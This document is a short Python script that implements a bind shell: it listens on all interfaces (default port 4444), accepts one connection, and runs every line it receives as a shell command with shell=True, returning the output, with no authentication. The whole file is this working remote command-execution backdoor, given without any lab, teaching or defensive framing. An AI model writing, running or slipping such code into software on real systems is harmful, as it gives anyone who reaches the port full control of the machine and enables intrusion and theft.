import socket
import click
import subprocess


def cmd_run(command):
    output = subprocess.run(
        command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
    )
    if output.stderr.decode():
        return output.stderr
    return output.stdout


@click.command()
@click.option(
    "--port", "-p", default=4444, help="set the in which the shell will be listening on"
)
def main(port):
    ip = "0.0.0.0"
    target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target.bind((ip, port))
    target.listen(1)
    clinet_socket, addr = target.accept()
    while True:
        chunks = []
        while True:
            chunk = clinet_socket.recv(1024)
            chunks.append(chunk)
            if chunk and chunk.decode()[-1] == "\n":
                break
            if not chunk:
                break

        command = (b"".join(chunks)).decode()[:-1]
        if command.strip() == "exit":
            clinet_socket.send(b"exit")
            clinet_socket.close()
            break
        output = cmd_run(command)
        clinet_socket.sendall(output)


if __name__ == "__main__":
    main()
